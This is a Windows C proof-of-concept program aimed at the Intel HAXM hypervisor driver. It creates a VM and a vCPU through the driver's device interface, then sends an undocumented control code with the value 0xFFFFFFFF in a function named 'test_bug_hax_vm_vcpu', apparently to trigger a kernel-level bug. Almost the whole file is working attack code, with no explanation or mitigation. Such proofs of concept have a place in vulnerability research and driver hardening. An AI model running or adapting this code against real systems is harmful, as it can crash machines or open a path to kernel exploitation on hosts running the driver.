#include "stdafx.h"
#include <Windows.h>

#define HAX_CREATE_VM 0x40002404
#define HAX_VM_CREATE_VCPU 0x40002408

void error(char *msg) {
	fprintf(stderr, "Error: %s\n", msg);
	exit(-1);
}

DWORD Create_HAX_VM(void)
{
	HANDLE hDevice = CreateFileA(
		"\\\\.\\HAX\\",
		GENERIC_READ | GENERIC_WRITE,
		0,
		NULL,
		OPEN_EXISTING,
		0,
		NULL);

	if (hDevice == NULL) {
		error("Could not open HAX device");
	}

	DWORD vmid = 0;
	DWORD bytesReturned = 0;

	if (NULL == DeviceIoControl(hDevice, HAX_CREATE_VM, 0, 0, &vmid, sizeof(DWORD), &bytesReturned, NULL)) {
		error("Problem during DeviceIOControl HAX_CREATE_VM");
	}

	CloseHandle(hDevice);

	return vmid;
}

void create_vcpu_for_vm(char *hax_vm_device, unsigned int vcpu_id) {
	char device_name[256] = { 0 };
	sprintf(device_name, "\\\\.\\%s\\", hax_vm_device);
	HANDLE hDevice = CreateFileA(
		device_name,
		GENERIC_READ | GENERIC_WRITE,
		0,
		NULL,
		OPEN_EXISTING,
		0,
		NULL
	);

	if (hDevice == NULL) {
		error("Could not open the specified hax_vm");
	}

	DWORD bytesReturned = 0;
	DWORD param = vcpu_id;
	if (NULL == DeviceIoControl(hDevice, HAX_VM_CREATE_VCPU, &param, 4, 0, 0, &bytesReturned, NULL)) {
		error("Problem during DeviceIOControl HAX_VM_CREATE_VCPU");
	}

	CloseHandle(hDevice);
}

void test_bug_hax_vm_vcpu(char *deviceName) {
	char device_name[256] = { 0 };
	sprintf(device_name, "\\\\.\\%s\\", deviceName);
	HANDLE hDevice = CreateFileA(
		device_name,
		GENERIC_READ | GENERIC_WRITE,
		0,
		NULL,
		OPEN_EXISTING,
		0,
		NULL
	);

	if (hDevice == NULL) {
		error("Could not open the specified hax_vm_vcpu");
	}

	DWORD bytesReturned = 0;
	DWORD param = 0xFFFFFFFF;
	if (NULL == DeviceIoControl(hDevice, 0x40002430, &param, 4, 0, 0, &bytesReturned, NULL)) {
		error("Problem during DeviceIOControl Bug");
	}

	CloseHandle(hDevice);
}

int main()
{

	DWORD vmid = Create_HAX_VM();

	char hax_vm_devicename[256] = { 0 };
	sprintf(hax_vm_devicename, "hax_vm%02x", vmid);
	printf("Target VM Name: %s\n", hax_vm_devicename);

	create_vcpu_for_vm(hax_vm_devicename, 7);

	char hax_vm_vcpu_devicename[256] = { 0 };
	sprintf(hax_vm_vcpu_devicename, "hax_vm%02x_vcpu%02x", vmid, 7);
	printf("Target VM VCPU Name: %s\n", hax_vm_vcpu_devicename);

	test_bug_hax_vm_vcpu(hax_vm_vcpu_devicename);
	return 0;
}